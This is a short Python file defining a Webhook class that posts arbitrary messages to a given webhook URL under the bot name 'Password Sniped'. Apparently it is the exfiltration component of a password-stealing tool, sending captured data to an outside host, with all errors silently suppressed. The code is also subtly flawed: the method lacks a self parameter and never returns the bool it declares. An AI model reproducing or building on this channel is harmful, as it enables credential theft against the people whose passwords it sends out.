import httpx 

httpx_client: object = httpx.Client()

class Webhook:
    def send(message: str, webhook_url: str) -> bool:
        try:
            payload = {"username": "Password Sniped", "content": f"{message}"}; 
            httpx_client.post(webhook_url, json=payload)
        except Exception as e:
            pass